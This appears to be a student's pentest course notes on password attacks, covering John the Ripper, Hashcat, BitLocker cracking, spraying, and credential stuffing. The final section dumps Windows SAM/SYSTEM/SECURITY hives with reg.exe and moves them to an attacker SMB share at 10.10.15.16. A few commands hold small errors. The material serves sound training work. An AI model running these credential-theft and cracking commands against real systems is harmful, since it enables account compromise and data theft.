# Passwords Attacks

John the Ripper (specifically the "Jumbo" version used in pentesting) is an open-source tool designed to crack password hashes. It supports hundreds of hash formats and can attack them using three primary methods: guessing based on user data, using dictionary wordlists, or brute-forcing every possible character combination.

#### 1. The Three Cracking Modes

| **Mode**         | **How it Works**                                                                                                                        | **When to Use It**                                                         | **Command Syntax**                            |
| ---------------- | --------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------- | --------------------------------------------- |
| **Single Crack** | Extracts usernames and real names (GECOS) from a Linux `passwd` file and applies mutation rules (e.g., swapping cases, adding numbers). | Best for poorly chosen passwords based on the user's own name or username. | `john --single <hash_file>`                   |
| **Wordlist**     | Tests every word inside a provided text file (dictionary) against the target hash.                                                      | The standard approach. Used with massive lists like `rockyou.txt`.         | `john --wordlist=<wordlist_file> <hash_file>` |
| **Incremental**  | A highly optimized brute-force attack using statistical models to guess the most likely character combinations first.                   | When you don't have a wordlist or the password is complex and random.      | `john --incremental <hash_file>`              |

#### 2. Identifying Unknown Hashes

If you find a hash but don't know what algorithm created it (MD5, SHA1, etc.), JtR won't know how to crack it.

* Use the **`hashid`** tool to analyze it.
* **Command:** `hashid -j <hash_string>` _(The `-j` flag tells the tool to print the exact format name that John the Ripper requires)._

#### 3. Cracking Encrypted Files (The `2john` Suite)

JtR cannot read physical files like a locked `.zip` or `.pdf` directly. You must first extract the encryption hash from the file using built-in conversion scripts, and then feed that hash to JtR.

* **Command:** `<format>2john <encrypted_file> > file.hash` _(Example: `zip2john secret.zip > zip.hash`)_ _(Example: `pdf2john document.pdf > pdf.hash`)_

#### 💻 Quick Command Reference Guide

Here are the essential commands you will use most often:

**Run a basic wordlist attack (if JtR auto-detects the format):**

Bash

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Run a wordlist attack forcing a specific format:**

Bash

```
john --format=ripemd-128 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**View successfully cracked passwords from a previous session:**

Bash

```
john --show hash.txt
```

**Extract only the clean password string from the `--show` output:**

Bash

```
john --show hash.txt | head -n 1 | cut -d: -f2
```

**Jhon formats types**

```

umedh@kali:~$ john --list=formats
descrypt, bsdicrypt, md5crypt, md5crypt-long, bcrypt, scrypt, LM, AFS, 
tripcode, AndroidBackup, adxcrypt, agilekeychain, aix-ssha1, aix-ssha256, 
aix-ssha512, andOTP, ansible, argon2, as400-des, as400-ssha1, asa-md5, 
AxCrypt, AzureAD, BestCrypt, BestCryptVE4, bfegg, Bitcoin, BitLocker, 
bitshares, Bitwarden, BKS, Blackberry-ES10, WoWSRP, Blockchain, chap, 
Clipperz, cloudkeychain, dynamic_n, cq, CRC32, cryptoSafe, sha1crypt, 
sha256crypt, sha512crypt, Citrix_NS10, dahua, dashlane, diskcryptor, Django, 
django-scrypt, dmd5, dmg, dominosec, dominosec8, DPAPImk, dragonfly3-32, 
dragonfly3-64, dragonfly4-32, dragonfly4-64, Drupal7, eCryptfs, eigrp, 
electrum, EncFS, enpass, EPI, EPiServer, ethereum, fde, Fortigate256, 
Fortigate, FormSpring, FVDE, geli, gost, gpg, HAVAL-128-4, HAVAL-256-3, hdaa, 
hMailServer, hsrp, IKE, ipb2, itunes-backup, iwork, KeePass, keychain, 
keyring, keystore, known_hosts, krb4, krb5, krb5asrep, krb5pa-sha1, krb5tgs, 
krb5-17, krb5-18, krb5-3, kwallet, lp, lpcli, leet, lotus5, lotus85, LUKS, 
MD2, mdc2, MediaWiki, monero, money, MongoDB, scram, Mozilla, mscash, 
mscash2, MSCHAPv2, mschapv2-naive, krb5pa-md5, mssql, mssql05, mssql12, 
multibit, mysqlna, mysql-sha1, mysql, net-ah, nethalflm, netlm, netlmv2, 
net-md5, netntlmv2, netntlm, netntlm-naive, net-sha1, nk, notes, md5ns, 
nsec3, NT, o10glogon, o3logon, o5logon, ODF, Office, oldoffice, 
OpenBSD-SoftRAID, openssl-enc, oracle, oracle11, Oracle12C, osc, ospf, 
Padlock, Palshop, Panama, PBKDF2-HMAC-MD4, PBKDF2-HMAC-MD5, PBKDF2-HMAC-SHA1, 
PBKDF2-HMAC-SHA256, PBKDF2-HMAC-SHA512, PDF, PEM, pfx, pgpdisk, pgpsda, 
pgpwde, phpass, PHPS, PHPS2, pix-md5, PKZIP, po, postgres, PST, PuTTY, 
pwsafe, qnx, RACF, RACF-KDFAES, radius, RAdmin, RAKP, rar, RAR5, Raw-SHA512, 
Raw-Blake2, Raw-Keccak, Raw-Keccak-256, Raw-MD4, Raw-MD5, Raw-MD5u, Raw-SHA1, 
Raw-SHA1-AxCrypt, Raw-SHA1-Linkedin, Raw-SHA224, Raw-SHA256, Raw-SHA3, 
Raw-SHA384, restic, ripemd-128, ripemd-160, rsvp, RVARY, Siemens-S7, 
Salted-SHA1, SSHA512, sapb, sapg, saph, sappse, securezip, 7z, Signal, SIP, 
skein-256, skein-512, skey, SL3, Snefru-128, Snefru-256, LastPass, SNMP, 
solarwinds, SSH, sspr, STRIP, SunMD5, SybaseASE, Sybase-PROP, tacacs-plus, 
tcp-md5, telegram, tezos, Tiger, tc_aes_xts, tc_ripemd160, tc_ripemd160boot, 
tc_sha512, tc_whirlpool, vdi, OpenVMS, vmx, VNC, vtp, wbb3, whirlpool, 
whirlpool0, whirlpool1, wpapsk, wpapsk-pmk, xmpp-scram, xsha, xsha512, zed, 
ZIP, ZipMonster, plaintext, has-160, HMAC-MD5, HMAC-SHA1, HMAC-SHA224, 
HMAC-SHA256, HMAC-SHA384, HMAC-SHA512, dummy, crypt
414 formats (149 dynamic formats shown as just "dynamic_n" here)
```

***

***

**Hashcat** is an open-source, industry-standard password recovery tool available for Linux, Windows, and macOS. While John the Ripper handles CPU processing efficiently, Hashcat is heavily optimized for **GPU acceleration**, making it exponentially faster at processing large-scale cracking operations.

### 📌 Core Command Syntax

The master formula for any Hashcat execution is structured like this:

Bash

```
hashcat -a [attack_mode] -m [hash_type] <hashes_file_or_string> [wordlists/rules/masks]
```

#### Option Flags Broken Down:

* **`-a` (Attack Mode):** Defines _how_ you want to guess the password (e.g., straight dictionary list, brute-force, or custom pattern).
* **`-m` (Hash Type):** Specifies the cryptographic algorithm that generated the target hash (e.g., MD5, NTLM, SHA-256).
* **`hashes`:** A text file containing the hashes you want to crack (one per line).
* **`wordlist/mask`:** The reference data used to generate password candidates.

### 🗂️ 1. Reference Tables

#### Core Attack Modes (`-a`)

| **ID**  | **Mode Name**              | **Description**                                                     | **Example Target Setup**                          |
| ------- | -------------------------- | ------------------------------------------------------------------- | ------------------------------------------------- |
| **`0`** | **Straight**               | Standard dictionary attack using a wordlist.                        | Comparing against a leaks file like `rockyou.txt` |
| **`1`** | **Combination**            | Combines words from multiple wordlists together.                    | Linking names and years (`John` + `2025`)         |
| **`3`** | **Brute-force / Mask**     | Guesses combinations based on a defined structural pattern.         | Cracking an unknown 8-character code              |
| **`6`** | **Hybrid Wordlist + Mask** | Appends a custom mask pattern onto the end of a wordlist word.      | Wordlist base + trailing numbers (`Password123`)  |
| **`7`** | **Hybrid Mask + Wordlist** | Prepends a custom mask pattern to the beginning of a wordlist word. | Leading characters + wordlist base (`2026_Admin`) |

#### Common Hash Mode IDs (`-m`)

If you don't define the correct ID via the `-m` flag, Hashcat will fail to parse your target string correctly.

| **Hash ID** | **Algorithm / Name** | **Practical Context**                                      |
| ----------- | -------------------- | ---------------------------------------------------------- |
| **`0`**     | **MD5**              | Legacy databases, older web applications                   |
| **`100`**   | **SHA1**             | Git object signatures, older corporate protocols           |
| **`1000`**  | **NTLM**             | Windows Active Directory / local SAM database hashes       |
| **`1400`**  | **SHA2-256**         | Modern application databases, file integrity verifications |
| **`1700`**  | **SHA2-512**         | High-security storage profiles                             |
| **`500`**   | **md5crypt**         | Older Linux system user passwords (`$1$`)                  |
| **`1800`**  | **sha512crypt**      | Modern Linux operating system user passwords (`$6$`)       |
| **`5600`**  | **NetNTLMv2**        | Windows network authentication captures (via Responder)    |

#### Built-in Character Sets (For Mask Attacks)

When writing custom brute-force patterns, use these variables to represent groups of characters:

| **Symbol** | **Character Set Content**                                     | **Equivalent Regular Expression** |
| ---------- | ------------------------------------------------------------- | --------------------------------- |
| **`?l`**   | Lowercase letters (`abcdefghijklmnopqrstuvwxyz`)              | `[a-z]`                           |
| **`?u`**   | Uppercase letters (`ABCDEFGHIJKLMNOPQRSTUVWXYZ`)              | `[A-Z]`                           |
| **`?d`**   | Digits (`0123456789`)                                         | `[0-9]`                           |
| **`?s`**   | Special characters / symbols ( `!"#$%&'()*+,-./:;<=>?@[\]^_`{ | }\~\`)                            |
| **`?a`**   | All configurations combined (`?l?u?d?s`)                      | Any standard keyboard character   |
| **`?b`**   | All possible 8-bit values                                     | `0x00 - 0xff`                     |

### 🚀 Practical Example Commands

#### Attack Mode 0: Standard Wordlist Attack

To run a direct dictionary match against an MD5 hash using `rockyou.txt`:

Bash

```
hashcat -a 0 -m 0 targeted_hash.txt /usr/share/wordlists/rockyou.txt
```

#### Attack Mode 0 + Rules: Mutated Dictionary Attack

When a plain wordlist isn't enough, you can add a **Ruleset** (typically stored in `/usr/share/hashcat/rules/`) to modify your dictionary on the fly. The `best64.rule` applies 64 standard human alterations like capitalizing letters or adding numbers:

Bash

```
hashcat -a 0 -m 0 targeted_hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

#### Attack Mode 3: Custom Mask (Pattern Brute-Force)

If you know the exact layout of a password, you can restrict the brute-force search space.

* **Scenario:** You know a target SHA-256 hash belongs to a password that is exactly 7 characters long, starting with 1 uppercase letter, followed by 4 lowercase letters, 1 number, and 1 special symbol (e.g., `P@ssw0rd!`).

Bash

```
hashcat -a 3 -m 1400 targeted_hash.txt '?u?l?l?l?l?d?s'
```

#### Custom Charset Assignments

If you want to limit character choices even further, define a custom list using `-1`, `-2`, `-3`, or `-4`:

* **Scenario:** You want to crack an NTLM hash where the password only uses the letters `h`, `t`, `b`, and numbers.

Bash

```
hashcat -a 3 -m 1000 targeted_hash.txt -1 htb0123456789 '?1?1?1?1?1'
```

_(This sets `?1` to mean only those specific characters, checking a length of 5)._

### 🔍 Handy Tips for Your Lab Work

1.  **Checking Your History:** Once Hashcat cracks a hash, it saves it to a file called `hashcat.potfile`. If you run the exact same command again, it might look like nothing happened. To see your cracked password cleanly, append the **`--show`** argument:

    ```
    hashcat -m 0 targeted_hash.txt --show
    ```
2.  **Auto-Identifying Unknown Hashes:** If you encounter a mysterious hash string, pass it to the **`hashid`** tool with the **`-m`** flag to find the correct Hashcat execution mode number instantly:

    ```
    hashid -m '$1$FNr44XZC$wQxY6HHLrgrGX0e1195k.1'
    ```
3.  **Handling Performance Issues:** If you are running Hashcat inside a virtual machine without a dedicated GPU pass-through, you might get a warning about an missing runtime environment. You can bypass this check and force it to execute via CPU threads by appending **`--force`**:

    ```
    hashcat -a 0 -m 0 targeted_hash.txt wordlist.txt --force
    ```

### Rule Syntax Reference Table

| **Function** | **Operation**                             | **Example Input (inlane)**        | **Result** |
| ------------ | ----------------------------------------- | --------------------------------- | ---------- |
| **`:`**      | No-op (Do nothing)                        | `inlane`                          | `inlane`   |
| **`l`**      | Lowercase all letters                     | `InLaNe`                          | `inlane`   |
| **`u`**      | Uppercase all letters                     | `inlane`                          | `INLANE`   |
| **`c`**      | Capitalize 1st letter, lowercase others   | `inlane`                          | `Inlane`   |
| **`sXY`**    | Replace all instances of **X** with **Y** | `so0` (Replace o with 0)          | `s0ccer`   |
| **`$`**      | Append a character to the very end        | `$!` (Append an exclamation mark) | `inlane!`  |

### 💻 Core Commands Reference

**1. Testing Rules Without Cracking (Dry-Run Generation)**

To see how a rule file modifies your wordlist without attempting to crack a hash, use the `--stdout` flag:

Bash

```
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```

**2. Harvesting Words from a Website with CeWL**

Bash

```
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
```

* `-d 4`: Spiders up to 4 links deep.
* `-m 6`: Only harvests words that are at least 6 characters long.
* `--lowercase`: Forces all collected words to be lowercase.

### 1. Mark's Personal OSINT Profile

* **Full Name:** Mark White
* **Date of Birth:** August 5, 1998 (Keywords: `08`, `05`, `1998`, `August`)
* **Employer:** Nexura, Ltd. (Keywords: `Nexura`, `Ltd`)
* **Location:** San Francisco, CA, USA (Keywords: `SanFrancisco`, `California`, `SF`)
* **Family/Pets:** Wife (`Maria`), Son (`Alex`), Cat (`Bella`)
* **Interests:** Baseball
* **Password Policy:** At least 12 characters long, 1 Upper, 1 Lower, 1 Number, 1 Symbol.

### 2. Step-by-Step Wordlist & Rules Creation

#### Step 1: Create the Base Wordlist (`mark_base.txt`)

Because the password must be **at least 12 characters long**, we will include both single keywords and common compound combinations of his details to easily cross that length threshold.

Run this in your terminal to create the file:

Bash

```
nano mark_base.txt
```

Paste these words into it:

Plaintext

```
MarkWhite
NexuraLtd
SanFrancisco
California
baseball
MariaAlex
BellaMaria
AlexBella
MarkWhite1998
Nexurabaseball
baseball1998
Maria1998
Bella1998
Alex1998
August1998
SanFrancisco98
NexuraLtd1998
```

_Save and exit (`Ctrl+O`, `Enter`, `Ctrl+X`)._

#### Step 2: Create the Custom Rules File (`mark.rule`)

These rules will modify our base words to add uppercase letters, convert characters to numbers (leetspeak), and append symbols to satisfy the policy.

Run this in your terminal:

Bash

```
nano mark.rule
```

Paste these rules (one per line):

Plaintext

```
:
c
so0
sa@
c$!
so0$!
sa@$!
so0$!$!
sa@c
so0sa@c
:cso0c
```

_Save and exit (`Ctrl+O`, `Enter`, `Ctrl+X`)._

### 3. Generate the Final Mutated Wordlist

To apply the rules to Mark's base details and compile them into an expanded, clean wordlist, run this command:

Bash

```
hashcat --force mark_base.txt -r mark.rule --stdout | sort -u > mark_final_wordlist.txt
```

### 4. Run Hashcat (Using Raw Hash String Directly)

To run the attack **without a hash file**, you pass the MD5 string `97268a8ae45ac7d15c3cea4ce6ea550b` directly as an argument right after the hash mode identifier (`-m 0`).

We will also use the **`--minlen=12`** flag to ensure Hashcat only spends processing time testing candidates that actually meet the company's 12-character constraint.

Bash

```
hashcat -a 0 -m 0 97268a8ae45ac7d15c3cea4ce6ea550b mark_final_wordlist.txt --minlen=12 --force
```

#### 🔍 Command Breakdown:

* **`-a 0`**: Dictionary attack mode.
* **`-m 0`**: Target hash type is raw MD5.
* **`97268a8ae45ac7d15c3cea4ce6ea550b`**: The target hash provided straight to the command line instead of a file.
* **`mark_final_wordlist.txt`**: Your expanded custom wordlist file.
* **`--minlen=12`**: Automatically drops any password candidate shorter than 12 characters.
* **`--force`**: Bypasses any virtualization/GPU driver warning blocks inside your Kali VM

***

***

#### What are `*2john` tools?

They are **hash extractors**. Password crackers like John the Ripper can't read complex files (like PDFs, ZIPs, or Excel spreadsheets) directly. A `*2john` tool strips away the file's outer data and extracts just the raw, text-based **cryptographic hash** so it can be cracked.

* **`zip2john`** ➡️ Extracts hashes from encrypted ZIPs.
* **`office2john.py`** ➡️ Extracts hashes from MS Office files (Word, Excel).
* **`pdf2john`** ➡️ Extracts hashes from PDFs.

#### 2. Quick Solution for the Excel Exercise

Because your `zip2john` command returned `0 lines`, it means the ZIP itself wasn't locked—the **`Confidential.xlsx`** spreadsheet inside was the real target.

Here is the exact, shortened workflow to solve it:

Bash

```
# Step 1: Unzip the file to get the Excel document
unzip /home/umedh/Downloads/c2d77580-c371-45c4-9af4-e964d8bdeef4.zip

# Step 2: Use the Office extractor to pull the real hash
office2john.py Confidential.xlsx > excel.hash

# Step 3: Crack the hash with rockyou
john --wordlist=/usr/share/wordlists/rockyou.txt excel.hash

# Step 4: Display the cracked password
john --show excel.hash
```

***

***

### Core Theory: The Post-Crack Architecture

When dealing with simple file types (like ZIP or RAR), cracking the password gives you immediate access to the files via standard unzipping utilities. However, when dealing with enterprise-grade storage mechanisms like **OpenSSL Encrypted Streams** or **Microsoft BitLocker Virtual Hard Disks (`.vhd`)**, cracking the password is only half the battle.

The data remains trapped inside a complex virtual file system structure. You must use specific kernel mapping configurations to make the operating system treat a raw file like an accessible, physical storage drive.

#### The 3 Encryption Architectures Covered:

1. **Native Archive Closures (ZIP):** The archive header itself contains the salt and encryption verification blocks. The hash is pulled out offline, cracked, and the password is used directly with `unzip`.
2. **Non-Native Wrapped Envelopes (OpenSSL + GZIP):** GZIP does not support passwords natively. OpenSSL encrypts the whole file stream. Since extracting a clean hash is unreliable due to false positives, the system attempts to decrypt live inside an active processing loop.
3. **Multi-Layer Storage Blocks (BitLocker VHD):** Microsoft seals a virtual hard drive with AES. The loop or network block device must map the file, a specialized decryption driver maps the unlocked blocks, and a loop mounter displays the target file tree structure.

### 🛠️ The Post-Cracking Mount Pipeline (Linux Loop Device Method)

When you crack a BitLocker `.vhd` file on Linux, the operating system cannot read it right away because it sees a locked block device. The text details a specific **3-layer mounting chain** to successfully view your data:

Plaintext

```
 [ Raw Backup.vhd File ] 
           │
           ▼  (Layer 1: losetup maps the file to system hardware)
   [ /dev/loop0p2 Partition ]
           │
           ▼  (Layer 2: dislocker decrypts the raw AES blocks)
   [ /media/bitlocker/dislocker-file ]
           │
           ▼  (Layer 3: mount attaches the virtual file system)
 [ /media/bitlockermount/ (Readable Directory) ]
```

### 💻 Expanded Command Blueprint & Deep Breakdown

#### 1. The Archive Extraction Utility (`unzip`)

Used to inspect, list, or unpack compressed ZIP archives on Linux filesystems.

Bash

```
unzip -l Archive.zip
unzip Archive.zip -d /home/umedh/loot/
```

| **Component**               | **Function**                                                                                                                                                                                                        |
| --------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **`unzip`**                 | Invokes the decompression utility for ZIP archives.                                                                                                                                                                 |
| **`-l`** (List)             | **Crucial Enumeration Step.** Lists all files inside the archive _without_ extracting them. This lets you check if there are hidden password-protected Excel sheets or PDFs inside before running extraction tools. |
| **`Archive.zip`**           | Specifies the target archive file you want to interact with.                                                                                                                                                        |
| **`-d /path/`** (Directory) | Optional flag that specifies a custom destination directory where the extracted files should be saved (instead of dumping them into your current working folder).                                                   |

#### 2. The ZIP Hash Extractor (`zip2john`)

Used to pull out the cryptographic attack signatures from a password-protected ZIP file container.

Bash

```
zip2john Protected.zip > zip.hash
```

| **Component**       | **Function**                                                                                       |
| ------------------- | -------------------------------------------------------------------------------------------------- |
| **`zip2john`**      | The specialized processing script that parses raw ZIP file headers.                                |
| **`Protected.zip`** | The target encrypted archive container file.                                                       |
| **`>`**             | Standard Linux output redirection operator.                                                        |
| **`zip.hash`**      | The text file where the extracted `$pkzip2$` hash string is stored so John or Hashcat can read it. |

#### 3. The BitLocker Storage Scanner (`bitlocker2john`)

Used to scan virtual hard disks and isolate the data sequences needed to mount a brute-force attack against Windows full-disk encryption.

Bash

```
bitlocker2john -i Backup.vhd > backup.hashes
```

| **Component**                    | **Function**                                                                                                         |
| -------------------------------- | -------------------------------------------------------------------------------------------------------------------- |
| **`bitlocker2john`**             | The specialized utility built to locate BitLocker headers within disk images.                                        |
| **`-i`** (Information / Inspect) | Instructs the tool to deeply inspect the internal structures, sectors, and metadata tables of the virtual disk file. |
| **`Backup.vhd`**                 | The target virtual hard disk container file.                                                                         |
| **`>`**                          | Redirects the verbose tool outputs into a storage document.                                                          |
| **`backup.hashes`**              | The raw file containing the extracted encryption components (User Passwords `$0` and Recovery Keys `$1`).            |

#### 4. The Hash Filter Line (`grep`)

Used to extract the clean user password target hash out of the noisy `bitlocker2john` output file.

Bash

```
grep "bitlocker\$0" backup.hashes > backup.hash
```

| **Component**        | **Function**                                                                                                                                                                                               |
| -------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **`grep`**           | The global regular expression search utility.                                                                                                                                                              |
| **`"bitlocker\$0"`** | The exact target pattern we are isolating. The **`\$`** uses a backslash to escape the dollar sign, telling the terminal to read it as a literal string character rather than a Bash environment variable. |
| **`backup.hashes`**  | The noisy input file generated by `bitlocker2john`.                                                                                                                                                        |
| **`>` backup.hash**  | Filters the results and writes the single clean hash line to `backup.hash`, ready to be cracked via Hashcat mode `-m 22100`.                                                                               |

```
john backup.hash --wordlists= /usr/share/wordlists/rockyou.txt
```

These command used to creak the password.

#### The BitLocker Post-Crack Extraction Workflow

Run these sequential commands once you recover the plaintext password (e.g., `1234qwer`).

**Step A: Attach the File to System Hardware**

Bash

```
sudo losetup -f -P Backup.vhd
```

* **`losetup`**: The Loop Device Setup utility. It tricks Linux into treating a regular file as a local physical block storage drive.
* **`-f`** (Find): Tells the system to scan and automatically assign the next available open loop number slot (typically `/dev/loop0`).
* **`-P`** (Partitions): Forces the kernel to scan the newly attached virtual disk for internal partitions, automatically exposing them as sub-devices (e.g., `/dev/loop0p1`, `/dev/loop0p2`).

**Step B: Decrypt the Raw Hardware Layer**

Bash

```
sudo mkdir -p /media/bitlocker 
sudo mkdir -p /media/bitlockermount
sudo dislocker /dev/loop0p2 -u1234qwer -- /media/bitlocker
```

* **`dislocker`**: The specialized utility used to read BitLocker encrypted partition volumes on Unix systems.
* **`/dev/loop0p2`**: Points directly to the specific internal data partition discovered by your hardware loop setup step.
* **`-u1234qwer`**: Passes your recovered plaintext user password into the decryption engine.
* **`--`**: Separator signaling the end of tool argument definitions and the beginning of the path destination array.
* **`/media/bitlocker`**: The temporary folder location where dislocker places its raw, decrypted image map interface (`dislocker-file`).

**Step C: Mount the File Matrix for Viewing**

Bash

```
sudo mount -o loop /media/bitlocker/dislocker-file /media/media/bitlockermount
```

* **`mount`**: Attaches a formatted storage file structure directly to your readable directory tree.
* **`-o loop`**: Instructs the filesystem engine to use a virtual loop translation channel to bind the raw memory image stream dynamically.
* **`/media/bitlocker/dislocker-file`**: The virtual decrypted partition file built in Step B.
* **`/media/bitlockermount`**: The target visible folder where your files are displayed cleanly.

#### 🛑 The Teardown Phase (Safe Exit Commands)

When your session ends, you must reverse your mounts cleanly to avoid lock state file corruption or system freezing:

Bash

```
sudo umount /media/bitlockermount
sudo umount /media/bitlocker
```

* **`umount`**: Safely unbinds active read/write points, flushes pending data buffers from cache memory back onto storage blocks, and disconnects the file access hooks cleanly.

***

***

### Password Attacks & Authentication Reference

| **Service** | **Default Port(s)**                            | **Cracking Tool**                 | **Cracking Command Syntax**                                                                                                                                                                                                                                                                                         | **Login Tool** | **Login Command Syntax**                                |
| ----------- | ---------------------------------------------- | --------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------- | ------------------------------------------------------- |
| **WinRM**   | <p>5985 (HTTP)<br><br><br><br>5986 (HTTPS)</p> | NetExec                           | `netexec winrm <target-IP> -u <user_list> -p <password_list>`                                                                                                                                                                                                                                                       | Evil-WinRM     | `evil-winrm -i <target-IP> -u <username> -p <password>` |
| **SSH**     | 22 (TCP)                                       | Hydra                             | `hydra -L <user_list> -P <password_list> ssh://<target-IP>`                                                                                                                                                                                                                                                         | OpenSSH Client | `ssh <username>@<target-IP>`                            |
| **RDP**     | 3389 (TCP)                                     | Hydra                             | `hydra -L <user_list> -P <password_list> rdp://<target-IP>`                                                                                                                                                                                                                                                         | xFreeRDP       | `xfreerdp /v:<target-IP> /u:<username> /p:<password>`   |
| **SMB**     | 445 (TCP)                                      | Metasploit _(or Hydra / NetExec)_ | <p><code>msfconsole -q</code><br><br><br><br><code>use auxiliary/scanner/smb/smb_login</code><br><br><br><br><code>set user_file &#x3C;user_list></code><br><br><br><br><code>set pass_file &#x3C;password_list></code><br><br><br><br><code>set rhosts &#x3C;target-IP></code><br><br><br><br><code>run</code></p> | Smbclient      | `smbclient -U <username> \\\\<target-IP>\\<SHARENAME>`  |

***

***

### Theoretical Breakdown

When attacking authentication mechanisms, understanding the precise differences between brute forcing, spraying, and stuffing prevents you from locking out accounts and ensures efficient target exploitation.

#### 1. Password Spraying (Horizontal Attack)

* **The Concept:** Traditional brute-forcing tries thousands of passwords against **one** account (Vertical). Password spraying does the inverse: it tries **one** password against **thousands** of accounts (Horizontal).
* **The Strategy:** This attack relies on poor organizational defaults (e.g., `Company2026!`, `Welcome123`).
* **The Advantage:** It evades **Account Lockout Policies**. If an active directory network locks an account after 3 failed attempts in an hour, trying 1 password per user across the whole domain will never trigger a lockout, but it will likely find the few users who never changed their initial passwords.

#### 2. Credential Stuffing (Leaked Data Reuse)

* **The Concept:** Automated injection of stolen username/password pairs obtained from historical database breaches (e.g., Comb, LinkedIn, or Adobe leaks) across entirely different services.
* **The Strategy:** This exploits human psychology—specifically **password reuse**. If a user uses the same email and password for a compromised hobby forum as they do for their corporate SSH server or email portal, the attacker gains entry.
* **The Advantage:** High success rate on public-facing assets because the credentials are valid pairings; they just need to be tested against the target service.

#### 3. Default Credentials (Administrative Oversight)

* **The Concept:** Testing factory-set usernames and passwords on network appliances, applications, and operating systems (e.g., `admin:admin`, `root:root`).
* **The Strategy:** Target identification during the reconnaissance phase. Systems deployed rapidly, internal testing environments, or forgotten network devices (like local routers or IoT elements) frequently retain default configurations out-of-the-box.

### Practical Cheat Sheet

#### 1. Password Spraying with NetExec (SMB)

Use this syntax to spray a single candidate password across an entire subnet without triggering account lockout limits:

Bash

```
netexec smb <Target_IP_or_Subnet> -u <usernames.list> -p 'Password123!'
```

* _Example Subnet Scope:_ `10.100.38.0/24`

#### 2. Credential Stuffing with Hydra (Using Combo Files)

When you possess a combined list of paired credentials in a `username:password` formatting scheme, use the `-C` flag to stuff them directly over network protocols like SSH:

Bash

```
hydra -C <user_pass_combo.list> ssh://<target-IP>
```

#### 3. Default Credentials Tool & Manual Lookups

Instead of scouring the web manually for appliance documentation, you can manage default combinations programmatically via Python.

*   **Installation:** Bash

    ```
    pip3 install defaultcreds-cheat-sheet
    ```
*   **Searching the Local DB:** Bash

    ```
    creds search <vendor_or_product_name>
    ```

    _(e.g., `creds search linksys` or `creds search cisco`)_

#### Common Network Router Defaults (Quick Reference)

| **Brand**   | **Default Gateway IP** | **Default Username** | **Default Password**          |
| ----------- | ---------------------- | -------------------- | ----------------------------- |
| **Linksys** | `http://192.168.1.1`   | `admin`              | `Admin` / `admin` / _(Blank)_ |
| **Netgear** | `http://192.168.0.1`   | `admin`              | `password`                    |
| **D-Link**  | `http://192.168.0.1`   | `admin`              | `Admin` / _(Blank)_           |
| **Belkin**  | `http://192.168.2.1`   | `admin`              | `admin`                       |

***

***

## Attacking SAM, SYSTEM, and SECURITY

When an attacker (or penetration tester) gains administrative access to a Windows machine, they can extract password data stored in memory or the registry to crack passwords offline or move laterally across a network.

Here is a plain-English, step-by-step breakdown of everything explained in the text.

### 1. The Core Targets: Registry Hives

Windows does not store passwords in plaintext. It stores them as cryptographic hashes within the Windows Registry. However, these registry files are normally locked by the operating system. If you have administrative privileges, you can force a copy of these three critical files ("hives"):

| Registry Hive       | What It Contains                          | Why It Matters                                                                                                           |
| ------------------- | ----------------------------------------- | ------------------------------------------------------------------------------------------------------------------------ |
| **`HKLM\SAM`**      | Local user account password hashes.       | Contains the hashes for local accounts (like the local `Administrator` or local custom users).                           |
| **`HKLM\SYSTEM`**   | The **Syskey/Boot Key**.                  | This hive contains the master key required to decrypt the SAM database. **You cannot read the SAM hashes without this.** |
| **`HKLM\SECURITY`** | LSA Secrets, DPAPI keys, and DCC2 hashes. | Contains cached passwords from domain users (Active Directory) who have logged into this specific machine before.        |

### 2. The Operational Workflow: Step-by-Step

The text outlines a 4-step workflow to steal these credentials safely without getting disconnected from the target system.

#### Step 1: Exporting the Hives (`reg.exe`)

Because you cannot simply copy-paste active system registry files, you use the native Windows utility `reg.exe` to save a backup clone of them to the root folder (`C:\`):

DOS

```
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

#### Step 2: Transferring the Files to the Attacker Machine

To analyze these files safely offline, you need to move them to your attack machine (e.g., Parrot OS/Kali Linux).

1. The text sets up a temporary folder share on the attack host using a tool called **Impacket's `smbserver.py`**.
2.  On the compromised Windows machine, the `move` command sends those saved files over the network directly into the attacker's folder:

    DOS

    ```
    move sam.save \\10.10.15.16\CompData
    ```

#### Step 3: Extracting the Hashes (`secretsdump.py`)

Once the files are safely on the Linux machine, you use **Impacket's `secretsdump.py`**. This script automatically extracts the master key from `system.save`, unlocks `sam.save` and `security.save`, and prints out the clean cryptographic hashes.

The output looks like this format: `Username : UserID : LM-Hash : NT-Hash`.

> **Note:** Modern Windows systems leave the LM-Hash section blank or filled with a default string (`aad3b435b...`) because LM is obsolete and insecure. The **NT-Hash** (at the very end) is what you actually want.

#### Step 4: Cracking the Hashes (`Hashcat`)

An NT-hash cannot be un-hashed directly, so you use a tool called **Hashcat** to guess millions of combinations a second using a "wordlist" (a massive text file of common real-world passwords, like `rockyou.txt`).

* **`-m 1000`**: This tells Hashcat that it is dealing specifically with Windows NT/NTLM hashes.
* If a password matches, Hashcat displays the plaintext version (e.g., `f7eb9c0...:dragon` means the password for that user was `dragon`).

### 3. Advanced Credential Types (DCC2 & DPAPI)

The text covers two other types of data found inside the **SECURITY** hive:

#### DCC2 (Domain Cached Credentials)

If a corporate laptop is disconnected from the office network, how can an employee still log in? Windows caches a highly secure copy of their corporate network password locally. This is a **DCC2 hash**.

* **Cracking Difficulty:** DCC2 uses modern, slow algorithms (PBKDF2). As the text points out, cracking a DCC2 hash is **800 times slower** than cracking a standard local NT hash.

#### DPAPI (Data Protection API)

This is a built-in Windows system used by applications to safely store your secrets. Think of it as a master safe box. Applications like **Google Chrome** (Saved Passwords), **Outlook**, and **Credential Manager** use DPAPI to lock away passwords.

* The text demonstrates using a post-exploitation tool called **Mimikatz** to extract Chrome's DPAPI keys, successfully revealing a user's web browser passwords in cleartext.

